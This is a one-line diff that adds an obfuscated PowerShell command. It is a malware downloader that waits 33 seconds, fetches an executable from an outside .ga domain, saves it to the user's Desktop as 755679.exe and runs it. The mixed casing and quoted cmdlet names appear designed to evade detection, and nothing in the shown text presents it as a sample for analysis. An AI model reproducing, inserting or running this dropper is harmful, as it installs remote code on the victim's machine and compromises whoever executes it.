@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLOadFiLE.iNVoKE('https://loadvisany.ga/losgo','$Des\755679.exe');&'Start-Process' $Des\755679.exe
